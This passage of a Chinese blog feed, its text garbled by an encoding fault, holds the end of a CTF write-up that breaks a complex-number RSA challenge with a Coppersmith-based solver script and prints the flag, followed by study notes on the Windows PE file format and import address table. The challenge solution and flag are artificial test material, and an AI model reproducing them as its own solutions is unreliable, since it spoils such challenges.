&gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = [<span class="number">90554536599623574119664951128649936419332926063696768860765928746438458550068553748440108394673303800443215316190882880737918820592384729010491685487061658710808286341751196450604089438847354206384322610922839055308138101241906861635339635907663440043442187064090630207952625897567214431195621589834131462698</span>, <span class="number">9144096375153318849308858335764188418198064372272913164911615933938183103747900881824918069830188301084043148828961577193063557255905230182831945580084452509300200269659063051152684191139872067872645370760797859584822240361290678189844670289832298393156571913616456958845361092243648857334156534377833472900</span>]</span><br><span class="line">c2 = [<span class="number">62925714576233017213228404230949787334346543378320798964656732359587152905032848271156799538355748406136742979043729040728123730886381468564779041856310262770766050213464073568850702827835472680885186487027698395099598698463717279017013124488699475168052581476224742146967412904416266652605031934025266540003</span>, <span class="number">62818668456104375760667670741457826560706388018921820295286033114468271151921637926389738844622672202424650967678199715932465104135980734708459543588178208672956785650944371545080965650112025782049517299538052360417245732776384089052839997333049599655001615752078742624898059780909287845495731050387891926520</span>]</span><br><span class="line">n = <span class="number">94040393367054633265453751757391098049234338193258976478647369399924701067077628840760704857546243644552533845934146003988635403227234096447871132283820920489003286967145732739404245319615714787916756200564828237043658350145929927911058782352154997346295194977765305107634012698472977467843980475009837261877</span></span><br><span class="line"></span><br><span class="line">c1 = Complex(c1[<span class="number">0</span>],c1[<span class="number">1</span>])</span><br><span class="line">c2 = Complex(c2[<span class="number">0</span>],c2[<span class="number">1</span>])</span><br><span class="line">c1n = complex_pow(c1,n,n).get_value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;m1&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="comment"># f = c1n - m1</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># m_1 = f.small_roots(X=2^128,beta=0.4)[0]</span></span><br><span class="line"><span class="comment"># q = gcd(c1n-m_1,n)</span></span><br><span class="line"><span class="comment"># p = n//q</span></span><br><span class="line"><span class="comment"># assert p*q == n</span></span><br><span class="line"><span class="comment"># print(f&#x27;p= &#123;p&#125;\nq= &#123;q&#125;&#x27;)</span></span><br><span class="line">q = <span class="number">7323077971059291689707065981399299595305255699400528762823657455799263529156562060157257164843406722707105788120169666250562251092133204672454047510142903</span></span><br><span class="line">p = <span class="number">12841648517017166445551091061211185386388830485650207877732791165106786665791893519935905079260599145467726270747052676462914579177741552378246815211750259</span></span><br><span class="line">phi = (p**<span class="number">2</span>-<span class="number">1</span>)*(q**<span class="number">2</span>-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">e = modinv(p,phi)*q%phi</span><br><span class="line">d = modinv(e,phi)</span><br><span class="line">m = complex_pow(c2,d,n).get_value()</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m[<span class="number">0</span>])),n2s(<span class="built_in">int</span>(m[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>
<p>æœ€å<strong>flag</strong>: flag{3ef6db06-b837-11ed-9825-00155dfcdef9}</p>
<p>æ€»ç»“ä¸€ä¸‹:<br>å…³é”®çŸ¥è¯†ç‚¹: å¤æ•°åŸŸä¸‹phiçš„ä¸åŒ<br>ä¸å¸¸è§„RSAçš„ç»“åˆ: éƒ½æœ‰ de&#x3D;kphi+1 éƒ½æœ‰coopersmithç­‰æ”»å‡»æ–¹æ³•<br>é€šè¿‡è¿™é“é¢˜å­¦ä¹ åˆ°å¤æ•°RSAçš„åŒæ—¶ è¿˜æ›´æ–°äº†cooperæ±‚kp,kqï¼</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†-C13-PEæ–‡ä»¶æ ¼å¼-ç¬”è®°</title>
    <url>/2023/12/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-C13-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†-C13-PEæ–‡ä»¶æ ¼å¼-ç¬”è®°</p>
<span id="more"></span>
<p>å‰å‡ å‘¨ç²—æµ…çœ‹äº†ä¸€é ç”±äºæ˜¯ç”µå­ç‰ˆ ä¹Ÿæ²¡ç•™ä¸‹å¤šå¤§å°è±¡<br>æœ€è¿‘CTFçš„reé¢˜çœ‹ç€å¤ªç´¯äº† åšä¸€ä¸ªé¢˜æŒºè€—æ—¶é—´çš„ æƒ³ç€æ˜¯åŸºç¡€è¿˜æ˜¯ä¸å¤Ÿæ‰å®<br>å†è€…å­¦é€†å‘çš„ç›®çš„ä¹Ÿä¸å…¨æ˜¯CTF æŒæ¡äº›ç†è®ºè¿˜æ˜¯å¾ˆé‡è¦çš„<br>å†æ¥é‡æ–°å­¦ä¸€å­¦ å†™ç¯‡ç¬”è®°è®°å½•ä¸€ä¸‹å…³é”®ç‚¹ ä¹Ÿå¯å‘è‡ªå·±æ€è€ƒ</p>
<h1 id="13-1-ä»‹ç»"><a href="#13-1-ä»‹ç»" class="headerlink" title="13.1 ä»‹ç»"></a>13.1 ä»‹ç»</h1><p>PE32 &amp; PE+&#x2F;PE32+ åˆ«å†™PE64 :(é—¹ç¬‘è¯</p>
<h1 id="13-2-PEæ–‡ä»¶æ ¼å¼"><a href="#13-2-PEæ–‡ä»¶æ ¼å¼" class="headerlink" title="13.2 PEæ–‡ä»¶æ ¼å¼"></a>13.2 PEæ–‡ä»¶æ ¼å¼</h1><p>å­¦ä¹ PEæ–‡ä»¶æ ¼å¼å°±æ˜¯å­¦ä¹ PEå¤´ä¸­çš„ç»“æ„ä½“<br><strong>ååˆ†é‡è¦ï¼ï¼ï¼</strong></p>
<h2 id="13-2-1-åŸºæœ¬ç»“æ„"><a href="#13-2-1-åŸºæœ¬ç»“æ„" class="headerlink" title="13.2.1 åŸºæœ¬ç»“æ„"></a>13.2.1 åŸºæœ¬ç»“æ„</h2><p>DOSå¤´åˆ°èŠ‚åŒºå¤´æ˜¯PEå¤´éƒ¨åˆ†(4D 5A â€¦ 50 45)<br>æ–‡ä»¶ä¸­ä½¿ç”¨åç§»(offset) å†…å­˜ä¸­ä½¿ç”¨VA(è™šæ‹Ÿåœ°å€)æ¥è¡¨ç¤ºä½ç½® å½“æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­æ—¶æƒ…å†µä¼šæ”¹å˜ å†…å®¹åˆ†ä¸º .text .data .rsrcåˆ†åˆ«ä¿å­˜</p>
<h2 id="13-2-2-VA-RVA"><a href="#13-2-2-VA-RVA" class="headerlink" title="13.2.2 VA&amp;RVA"></a>13.2.2 VA&amp;RVA</h2><p>RVA(ç›¸å¯¹è™šæ‹Ÿåœ°å€) + ImageBase(åŸºå‡†ä½ç½®) &#x3D; VA<br>PEå¤´å†…éƒ¨ä¿¡æ¯å¤§å¤šä»¥RVAå½¢å¼ å› ä¸ºPE(å°¤å…¶æ˜¯DLL)åŠ è½½åˆ°è¿›ç¨‹è™šæ‹Ÿå†…å­˜æ—¶ç”±äºè¯¥ä½ç½®å·²ç»åŠ è½½å…¶ä»–PE(DLL) è¦é€šè¿‡é‡å®šä½åŠ è½½åˆ°å…¶ä»–ç©ºç™½çš„ä½ç½®<br>ç”¨RVAå°±åªéœ€è¦è®°å½•ImageBaseå°±å¯ä»¥å¾—åˆ°VA</p>
<h1 id="13-3-PEå¤´"><a href="#13-3-PEå¤´" class="headerlink" title="13.3 PEå¤´"></a>13.3 PEå¤´</h1><h2 id="13-3-1-DOSå¤´"><a href="#13-3-1-DOSå¤´" class="headerlink" title="13.3.1 DOSå¤´"></a>13.3.1 DOSå¤´</h2><p>é‡ç‚¹å…³æ³¨ä¸¤ä¸ªæˆå‘˜</p>
<ul>
<li>e_magic: DOSç­¾å (4D5A &#x3D;&gt; â€œMZâ€)</li>
<li>e_lfanew: æŒ‡ç¤ºNTå¤´çš„åç§» (ä¸åŒæ–‡ä»¶å€¼å¯å˜)</li>
</ul>
<p>åœ¨ä¹¦ç»™çš„exeä¸­ e_lfanewçš„å€¼ä¸º 000000E0(å°ç«¯åº!)</p>
<h2 id="13-3-2-DOSå­˜æ ¹"><a href="#13-3-2-DOSå­˜æ ¹" class="headerlink" title="13.3.2 DOSå­˜æ ¹"></a>13.3.2 DOSå­˜æ ¹</h2><p>40~4Dä¸ºæ±‡ç¼–æŒ‡ä»¤(æœ‰å…´è¶£æŠŠå®ƒå†™å…¥æ–‡ä»¶IDAåº·åº·)<br>ä¸»è¦å°±æ˜¯ç”¨æ¥è¾“å‡ºä¸€ä¸‹â€This program â€¦ DOS modeâ€å°±é€€å‡ºäº† ç®—æ˜¯ä¸€ç§å¯¹äºMS-DOSçš„å…¼å®¹</p>
<h2 id="13-3-3-NTå¤´"><a href="#13-3-3-NTå¤´" class="headerlink" title="13.3.3 NTå¤´"></a>13.3.3 NTå¤´</h2><p>NTå¤´çš„IMAGE_NT_HEADERS</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;    <span class="comment">//ç­¾å</span></span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;   <span class="comment">//æ–‡ä»¶å¤´</span></span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader; <span class="comment">//å¯é€‰å¤´</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>
<p>signatureå³ä¸º50450000(â€œPEâ€00)<br>IMAGE_NT_HEADERSç»“æ„ä½“æ€»å¤§å°ä¸ºF8 å¾ˆå¤§</p>
<h2 id="13-3-4-NTå¤´-æ–‡ä»¶å¤´"><a href="#13-3-4-NTå¤´-æ–‡ä»¶å¤´" class="headerlink" title="13.3.4 NTå¤´: æ–‡ä»¶å¤´"></a>13.3.4 NTå¤´: æ–‡ä»¶å¤´</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD  Machine;</span><br><span class="line">  WORD  NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD  SizeOfOptionalHeader;</span><br><span class="line">  WORD  Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>
<ul>
<li>Machine: æ¯ä¸ªCPUéƒ½æœ‰å”¯ä¸€çš„machineç </li>
<li>NumberOfSections: æ–‡ä»¶ä¸­å­˜åœ¨çš„èŠ‚åŒºæ•°é‡</li>
<li>SizeOfOptionalHeader: IMAGE_OPTIONAL_HEADER64ç»“æ„ä½“å¤§å°</li>
<li>Characteristics: æ ‡è¯†æ–‡ä»¶å±æ€§ æ˜¯å¦å¯è¿è¡Œ æ˜¯å¦ä¸ºDLLç­‰</li>
<li>TimeDateStamp: è¯¥æˆå‘˜çš„å€¼ä¸å½±å“è¿è¡Œ ç”¨æ¥è®°å½•æ—¶é—´è€Œå·²</li>
</ul>
<h2 id="13-3-5-NTå¤´-å¯é€‰å¤´"><a href="#13-3-5-NTå¤´-å¯é€‰å¤´" class="headerlink" title="13.3.5 NTå¤´: å¯é€‰å¤´"></a>13.3.5 NTå¤´: å¯é€‰å¤´</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨ä»¥ä¸‹æˆå‘˜</p>
<ul>
<li>Magic: IMAGE_OPTIONAL_HEADERä¸º32ä½-10B 64ä½-20B</li>
<li><strong>AddressOfEntryPoint</strong>: æŒæœ‰EPçš„RVAå€¼ï¼ï¼ï¼ æŒ‡å‡ºç¨‹åºæœ€å…ˆæ‰§è¡Œä»£ç èµ·å§‹åœ°å€ï¼ï¼ï¼</li>
<li>ImageBase: åœ¨PEæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜æ—¶ æŒ‡å‡ºæœ‰é™è£…è½½çš„åœ°å€<br>EXE DLLè¢«è£…è½½åˆ°ç”¨æˆ·å†…å­˜çš„0 ~ 7FFFFFFF    SYSè¢«è£…è½½åˆ°å†…æ ¸å†…å­˜çš„80000000 ~ FFFFFFFF<br>ä¸€èˆ¬è€Œè¨€ ç”¨å¼€å‘å·¥å…·åˆ›å»ºEXEå ImageBaseå€¼ä¸º00400000 DLLæ–‡ä»¶çš„ImageBaseå€¼ä¸º10000000(ä¹Ÿå¯ä¸ºå…¶ä»–å€¼)<br>æ‰§è¡ŒPEæ–‡ä»¶æ—¶ PEè£…è½½å™¨å…ˆåˆ›å»ºè¿›ç¨‹ å†å°†æ–‡ä»¶è½½å…¥å†…å­˜ ç„¶åæŠŠEIPè®¾ç½®ä¸ºImageBase+AddressOfEntryPoint</li>
<li>SectionAlignment FileAlignment: PEæ–‡ä»¶çš„bodyéƒ¨åˆ†è¢«åˆ’åˆ†ä¸ºèŠ‚åŒº<br>FileAlignmentæŒ‡å®šäº†èŠ‚åŒºåœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„æœ€å°å•ä½<br>SectionAlignmentåˆ™æŒ‡å®šäº†èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½</li>
<li>SizeOfImage: åŠ è½½PEæ–‡ä»¶åˆ°å†…å­˜æ—¶ SizeOfImageæŒ‡å®šäº†PE Imageåœ¨è™šå­˜ä¸­æ‰€å ç©ºé—´å¤§å°</li>
<li>SizeOfHeaders: æŒ‡å‡ºæ•´ä¸ªPEå¤´çš„å¤§å°<br>ç¬¬ä¸€èŠ‚åŒºæ‰€åœ¨ä½ç½®ä¸SizeOfHeadersè·æ–‡ä»¶å¼€å§‹çš„offsetç›¸åŒ</li>
<li>Subsystem: åŒºåˆ†é©±åŠ¨æ–‡ä»¶(.sys)å’Œæ™®é€šçš„å¯æ‰§è¡Œæ–‡ä»¶(.exe .dll)</li>
<li>NumberOfRvaAndSizes: æŒ‡å®šæœ€åä¸€ä¸ªæˆå‘˜DataDirectoryæ•°ç»„çš„ä¸ªæ•°(å¤§å°ä¸ä¸€å®šä¸º16)</li>
<li>DataDirectory:<br><img src="https://s2.loli.net/2023/12/03/IVkU3uvCy9dxPJZ.png" alt="img"><br>é‡ç‚¹å…³æ³¨0,1,9 EXPORT IMPORT TLS</li>
</ul>
<h2 id="13-3-6-èŠ‚åŒºå¤´"><a href="#13-3-6-èŠ‚åŒºå¤´" class="headerlink" title="13.3.6 èŠ‚åŒºå¤´"></a>13.3.6 èŠ‚åŒºå¤´</h2><p>PEæ–‡ä»¶è¢«åˆ›å»ºä¸ºå¤šä¸ªèŠ‚åŒºç»“æ„(æ›´åŠ å®‰å…¨ eg.ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢ç¼“å†²åŒºæº¢å‡º)</p>
<ul>
<li>code: æ‰§è¡Œ å¯è¯»å–</li>
<li>data: éæ‰§è¡Œ å¯è¯»å†™</li>
<li>resource: éæ‰§è¡Œ å¯è¯»å–</li>
</ul>
<p>å„ä¸ªèŠ‚åŒºçš„å±æ€§è¢«è®°å½•åœ¨èŠ‚åŒºå¤´ä¸­</p>
<p>IMAGE_SECTION_HEADER</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
<ul>
<li>VirtualSize: å†…å­˜ä¸­èŠ‚åŒºæ‰€å å¤§å°</li>
<li>VirtualAddress: å†…å­˜ä¸­èŠ‚åŒºèµ·å§‹ä½ç½®(RVA)</li>
<li>SizeOfRawData: ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºæ‰€å å¤§å°</li>
<li>PointerToRawData: ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºèµ·å§‹ä½ç½®</li>
<li>Characteristics: èŠ‚åŒºå±æ€§(bit OR)</li>
</ul>
<p>å…¶ä¸­VirtualAddresså’ŒPointerToRawDataä¸å¸¦æœ‰ä»»ä½•å€¼ ç”±å¯é€‰å¤´ä¸­çš„SectionAlignmentå’ŒFileAlignmentç¡®å®š<br>VirtualSizeå’ŒSizeOfRawDataå€¼ä¸€èˆ¬ä¸åŒ!<br>æœ€åçœ‹çœ‹Nameå­—æ®µ å¯ä»¥å‘å…¶ä¸­æ”¾å…¥ä»»ä½•å€¼(ç”šè‡³å¯ä»¥NULLå¡«å……)</p>
<p><img src="https://s2.loli.net/2023/12/03/VcswHEPriI5SOgB.png" alt="img"></p>
<h1 id="13-4-RVA-to-RAW"><a href="#13-4-RVA-to-RAW" class="headerlink" title="13.4 RVA to RAW"></a>13.4 RVA to RAW</h1><p><img src="https://s2.loli.net/2023/12/03/bVn7942XuTZ18OY.png" alt="img"><br>å³ç£ç›˜åˆ°å†…å­˜çš„æ˜ å°„<br>æ–¹æ³•:</p>
<ol>
<li>æŸ¥æ‰¾RVAæ‰€åœ¨èŠ‚åŒº</li>
<li>å…¬å¼è®¡ç®—åç§»(RAW)<br><code>offset = RAW - PointerToRawData = RVA - VitrualAddress </code></li>
</ol>
<p>å‡ ä¸ªç»ƒä¹ :<br><img src="https://s2.loli.net/2023/12/03/VcswHEPriI5SOgB.png" alt="img"></p>
<p>Q1. RVA &#x3D; 5000æ—¶ FileOffset &#x3D; ?<br>A1. RVA:ç¬¬ä¸€èŠ‚åŒº PTR&#x3D;RawAddress &#x3D; 400 VA &#x3D; 1000 &#x3D;&gt; RAW &#x3D; 4400</p>
<p>Q2. RVA &#x3D; 13314<br>A2. ç¬¬ä¸‰èŠ‚åŒº VA &#x3D; B000 PTR &#x3D; 8400 &#x3D;&gt; RAW &#x3D; 10714</p>
<p>Q3. RVA &#x3D; ABA8<br>A3. ç¬¬äºŒèŠ‚åŒº VA&#x3D;9000 PTR &#x3D; 7C00 &#x3D;&gt; RAW &#x3D; 97A8<br>å‘ç°ç®—å‡ºæ¥åç§»åœ¨ç¬¬ä¸‰èŠ‚åŒº è¯´æ˜â€æ— æ³•å®šä¹‰RVA(ABA8)ç›¸å¯¹åº”çš„RAWå€¼â€<br>åŸå› : ç¬¬äºŒèŠ‚åŒºçš„ VirtualSizeæ¯”RawSizeå¤§!</p>
<h1 id="13-5-IAT"><a href="#13-5-IAT" class="headerlink" title="13.5 IAT"></a>13.5 IAT</h1><p><strong>éš¾ç‚¹æ¥äº†</strong><br>IAT: å¯¼å…¥åœ°å€è¡¨(Import Address Table)<br>IATä¿å­˜çš„å†…å®¹ä¸Windowsæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒè¿›ç¨‹ å†…å­˜ DLLç»“æ„ç­‰æœ‰å…³<br>ç®€è¨€ä¹‹ IATæ˜¯ä¸€ç§è¡¨æ ¼ ç”¨æ¥è®°å½•ç¨‹åºæ­£åœ¨ä½¿ç”¨å“ªäº›åº“ä¸­çš„å“ªäº›å‡½æ•°</p>
<h2 id="13-5-1-DLL"><a href="#13-5-1-DLL" class="headerlink" title="13.5.1 DLL"></a>13.5.1 DLL</h2><p>ç›¸æ¯”æ—©æœŸåªæœ‰åº“(library) DLL</p>
<ul>
<li>ä¸éœ€è¦æŠŠåº“åŒ…å«åœ¨ç¨‹åºä¸­ å•ç‹¬ç»„æˆDLLæ–‡ä»¶ éœ€è¦æ—¶è°ƒç”¨å³å¯</li>
<li>å†…å­˜æ˜ å°„æŠ€æœ¯ä½¿åŠ è½½åçš„DLLä»£ç  èµ„æº èƒ½åœ¨å¤šä¸ªè¿›ç¨‹ä¸­å®ç°å…±äº«</li>
<li>æ›´æ–°åº“æ—¶åªéœ€è¦æ›¿æ¢ç›¸å…³DLLæ–‡ä»¶å³å¯</li>
</ul>
<p>åŠ è½½DLLçš„ä¸¤ç§æ–¹å¼</p>
<ul>
<li>æ˜¾ç¤ºé“¾æ¥: ç¨‹åºä½¿ç”¨DLLæ—¶åŠ è½½ ä½¿ç”¨å®Œæ¯•åé‡Šæ”¾å†…å­˜</li>
<li>éšå¼é“¾æ¥: ç¨‹åºä¸€å¼€å§‹å°±ä¸€åŒåŠ è½½DLL ç¨‹åºç»ˆæ­¢æ—¶å†é‡Šæ”¾å ç”¨çš„å†…å­˜  IATæœºåˆ¶ä¸è¿™ç§é“¾æ¥æ–¹å¼æœ‰å…³</li>
</ul>
<p>OllyDbgæŸ¥çœ‹notepad.exe</p>
<p><img src="https://s2.loli.net/2023/12/03/3XKFV2lzoc18G7j.png" alt="img"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°<br>è°ƒç”¨CreateFileW()æ—¶å¹¶éç›´æ¥è°ƒç”¨è€Œæ˜¯è·å–01001104å¤„çš„åœ°å€æ¥å®ç°(æ‰€æœ‰APIè°ƒç”¨å‡å¦‚æ­¤)<br>åœ°å€01001104æ˜¯.textèŠ‚åŒºçš„å†…å­˜åŒºåŸŸ(IATå†…å­˜åŒºåŸŸ) åœ°å€çš„å€¼7645EA70å³ä¸ºåŠ è½½åˆ°exeè¿›ç¨‹å†…å­˜ä¸­CreateFileW()å‡½æ•°(ä½äºkernel32.dllåº“)çš„åœ°å€<br>æ¯”è¾ƒä¹¦å’Œæœ¬åœ°å¯ä»¥å‘ç° 01001104åœ°å€çš„å€¼æœ‰å·®å¼‚ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé€šè¿‡01001104è€Œä¸æ˜¯é€šè¿‡å®ƒæŒ‡å‘çš„åœ°å€çš„å€¼æ¥è°ƒç”¨<br>åŒæ—¶ç”±äºDLLçš„é‡å®šä½ å¯¼è‡´æ— æ³•å¯¹å®é™…åœ°å€ç¡¬ç¼–ç  åŒæ—¶PEå¤´ä¸­è¡¨ç¤ºåœ°å€æ—¶ä½¿ç”¨çš„æ˜¯RVAè€Œä¸æ˜¯VA</p>
<h2 id="13-5-2-IMAGE-IMPORT-DECRIPTOR"><a href="#13-5-2-IMAGE-IMPORT-DECRIPTOR" class="headerlink" title="13.5.2 IMAGE_IMPORT_DECRIPTOR"></a>13.5.2 IMAGE_IMPORT_DECRIPTOR</h2><p>IMAGE_IMPORT_DECRIPTORç»“æ„ä½“è®°å½•ç€PEæ–‡ä»¶è¦å¯¼å…¥å“ªäº›åº“æ–‡ä»¶<br>IMAGE_IMPORT_DECRIPTORç»“æ„ä½“æ•°ç»„ä¹Ÿè¢«ç§°ä¸ºIMPORT Directory Table (å¯¼å…¥ç›®å½•)<br>å¯¼å…¥å¤šå°‘ä¸ªåº“å°±æ„å‘³ç€æœ‰å¤šå°‘ä¸ªIMAGE_IMPORT_DECRIPTORç»“æ„ä½“</p>
<p><img src="https://s2.loli.net/2023/12/03/au16VZ8spBbtfmH.png" alt="img"></p>
<ul>
<li>OriginalFirstThunk(OFT): INTçš„åœ°å€(RVA)</li>
<li>Name: åº“åç§°å­—ç¬¦ä¸²çš„åœ°å€(RVA)</li>
<li>FirstThunk(FT): IATçš„åœ°å€(RVA)</li>
</ul>
<p>æç¤º:</p>
<ul>
<li>PEå¤´ä¸­æåˆ°çš„tableå‡æŒ‡æ•°ç»„</li>
<li>INTå’ŒIATæ˜¯é•¿æ•´å‹ ä»¥NULLç»“æŸ</li>
<li>INTä¸­å„å…ƒç´ çš„å€¼ä¸ºIMAGE_IMPORT_BY_NAMEç»“æ„ä½“æŒ‡é’ˆ</li>
<li>INTä¸IATå¤§å°åº”ç›¸åŒ</li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/XWDsoRfdbH8ZJFx.png" alt="img"></p>
<p>è¿™å¼ å›¾ä¸­ INTå’ŒIATå„å…ƒç´ åŒæ—¶æŒ‡å‘ç›¸åŒåœ°å€ ä½†å¾ˆå¤šæƒ…å†µä¸‹ä»–ä»¬æ˜¯ä¸ä¸€è‡´çš„ è¦æ³¨æ„</p>
<p>ç®€å•äº†è§£ä¸‹PEè£…è½½å™¨æŠŠå¯¼å…¥å‡½æ•°è¾“å…¥IATçš„é¡ºåº:</p>
<ol>
<li>è¯»å–IIDçš„Nameæˆå‘˜ è·å–åº“åç§°å­—ç¬¦ä¸²(â€œkernel32.dllâ€)</li>
<li>è£…è½½ç›¸åº”åº“ -&gt; LoadLibrary(â€œkernel32.dllâ€)</li>
<li>è¯»å–IIDä¸­OFTæˆå‘˜ è·å–INTåœ°å€</li>
<li>é€ä¸€è¯»å–INTæ•°ç»„ä¸­çš„å€¼ è·å–ç›¸åº”IMAGE_IMPORT_BY_NAMEåœ°å€(RVA)</li>
<li>ä½¿ç”¨IIBNçš„Hint(ordinal)æˆ–Nameé¡¹ è·å¾—ç›¸åº”å‡½æ•°çš„èµ·å§‹åœ°å€</li>
<li>è¯»å–IIDçš„FT(IAT)æˆå‘˜ è·å¾—IATåœ°å€</li>
<li>å°†ä¸Šé¢è·å–çš„å‡½æ•°åœ°å€è¾“å…¥ç›¸åº”çš„IATæ•°ç»„å€¼</li>
<li>é‡å¤4-7 ç›´è‡³INTç»“æŸ(é‡åˆ°NULL)</li>
</ol>
<h2 id="13-5-3-ä½¿ç”¨notepad-exeç»ƒä¹ "><a href="#13-5-3-ä½¿ç”¨notepad-exeç»ƒä¹ " class="headerlink" title="13.5.3 ä½¿ç”¨notepad.exeç»ƒä¹ "></a>13.5.3 ä½¿ç”¨notepad.exeç»ƒä¹ </h2><p>é¦–å…ˆè¦æ˜ç¡® IMAGE_IMPORT_DECRIPTORç»“æ„ä½“ä¸åœ¨PEå¤´è€Œåœ¨PEä½“ä¸­ ä½†æŸ¥æ‰¾å…¶ä½ç½®çš„ä¿¡æ¯åœ¨PEå¤´ä¸­<br>å‰é¢æåˆ°è¿‡ NTå¤´ä¸­å¯é€‰å¤´æœ€åä¸€ä¸ªæˆå‘˜DataDirectoryçš„ [1]è®°å½•çš„å°±æ˜¯IMAGE_IMPORT_DECRIPTORç»“æ„ä½“çš„èµ·å§‹ä½ç½®(RVA)<br>å€¼ä¸º7604<br>RVA-&gt;RAW: ç¬¬ä¸€èŠ‚åŒº RAW&#x3D;0x7604-0x1000+0x400 &#x3D; 6A04<br>WinHEXä¸­æ‰¾åˆ° å¯ä»¥çœ‹åˆ°OFT(INT)çš„RVAå€¼ä¸º7990 -&gt; RAW: 6D90   Name RVA:7AAC -&gt; RAW:6EAC  FT(IAT) RVA:12C4-&gt; RAW:6C4<br>è·Ÿè¸ªNameå¯ä»¥çœ‹åˆ° comdlg.dllå­—ç¬¦ä¸²<br>è·Ÿè¸ªINT 